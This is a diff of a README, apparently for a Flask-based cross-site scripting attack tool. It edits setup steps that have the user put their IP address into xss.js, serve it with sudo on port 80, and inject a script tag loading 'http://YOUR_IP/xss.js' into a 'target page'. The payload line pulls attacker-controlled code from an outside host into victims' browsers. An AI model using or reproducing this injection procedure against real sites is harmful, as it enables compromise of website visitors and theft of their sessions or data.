@@ -25,7 +25,8 @@ Cross-Site Scripting (XSS) is a security vulnerability typically found in web ap
 1. Clone this repository.
 2. Install dependencies:
    ```pip install flask```
-3. Run the Flask app (default port 80):
+3. Modify xss.js to insert your IP address.
+4. Run the Flask app (default port 80):
   ```sudo python3 app.py```
-4. Inject the following script tag on your target page (adjust IP/port as needed):
+5. Inject the following script tag on your target page (adjust IP/port as needed):
   ```<script src="http://YOUR_IP/xss.js"></script>```
